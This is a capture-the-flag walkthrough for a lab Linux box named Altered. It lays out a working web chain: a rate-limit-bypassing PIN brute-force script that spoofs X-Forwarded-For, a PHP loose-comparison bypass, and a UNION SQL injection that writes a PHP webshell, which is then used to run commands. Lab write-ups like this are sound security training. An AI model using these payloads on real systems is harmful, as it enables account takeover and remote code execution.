## Overview

Altered is a hard-rated Linux box centered on a Laravel application. The path to user is a pure web chain: enumerate a valid username, brute-force a short password-reset PIN by bypassing rate limiting with a spoofed proxy header, then abuse a type-juggling flaw and SQL injection in a profile API to write a PHP webshell. This post stops at `user.txt`.

## Recon

| Port | Service | Version |
|------|---------|---------|
| 22   | SSH     | OpenSSH 8.2p1 (Ubuntu) |
| 80   | HTTP    | nginx 1.18.0 — Laravel "UHC March Finals" |

```bash
nmap -p- --min-rate=1000 -T4 10.129.227.109
nmap -p22,80 -sC -sV 10.129.227.109
```

Only SSH and a web app. Everything happens on port 80.

## Enumeration

The login page returns **different errors** for a wrong password (`Invalid Password`) versus a non-existent user, so usernames are enumerable — `admin` is valid. The "Forgot Password" flow at `/reset` emails a **4-digit PIN** (1000–9999) bound to the `laravel_session` cookie, and PIN guesses are checked at `POST /api/resettoken`.

Guessing is rate-limited (HTTP 429), but the app sits behind Nginx and trusts the `X-Forwarded-For` header as the client IP — so rotating that header per request makes every guess look like a new client.

## Foothold

**1. Brute the reset PIN (rate-limit bypass).** Request the PIN, then iterate the 9000-value space in the same session, rotating `X-Forwarded-For` each request and detecting the hit by a response-size difference:

```bash
python3 -c "import requests;from concurrent.futures import ThreadPoolExecutor as T;s=requests.Session();s.get('http://10.129.227.109/reset');s.post('http://10.129.227.109/reset',data={'name':'admin'});B=len(s.post('http://10.129.227.109/api/resettoken',data={'name':'admin','pin':'0000'},headers={'X-Forwarded-For':'127.0.0.200'}).text);f=lambda p:print('HIT',p) if len(s.post('http://10.129.227.109/api/resettoken',data={'name':'admin','pin':str(p)},headers={'X-Forwarded-For':'127.0.0.'+str(p%254+1)}).text)!=B else None;list(T(max_workers=30).map(f,range(1000,10000)))"
```

The winning response returns a "set new password" form (`/changepw`); set a new admin password and log in.

**2. Type-juggle the profile API.** Logged in, the winners table "view" buttons call `GET /api/getprofile` with an `id` and a `secret`. The `secret` is checked with PHP's loose `==`, so a JSON boolean `true` matches any stored secret:

```bash
curl -s -b /tmp/sess.txt -X GET "http://10.129.227.109/api/getprofile" \
  -H "Content-Type: application/json" --data-raw '{"id":4,"secret":true}'
```

**3. UNION SQL injection → webshell.** With the secret check bypassed, `id` is a raw MySQL UNION injection point. MySQL has FILE privilege and an empty `secure_file_priv`, so `INTO OUTFILE` writes a PHP webshell into the web root (`/srv/altered/public`, found via `load_file` on the Nginx config):

```bash
curl -s -b /tmp/sess.txt -X GET "http://10.129.227.109/api/getprofile" \
  -H "Content-Type: application/json" \
  --data-raw "{\"id\":\"100 union select 1,2,'<?php system(\$_GET[0]); ?>' into outfile '/srv/altered/public/c.php'-- -\",\"secret\":true}"

curl -s "http://10.129.227.109/c.php" --data-urlencode "0=id" -G
# uid=33(www-data) gid=33(www-data) groups=33(www-data),117(mysql)
```

## User flag

![user flag](/assets/Images/altered-001_foothold_user-flag.png)

```bash
curl -s "http://10.129.227.109/c.php" --data-urlencode "0=cat /home/htb/user.txt" -G   # HTB{...}
```

Code execution as `www-data` achieved, and `user.txt` lives in `/home/htb/`.
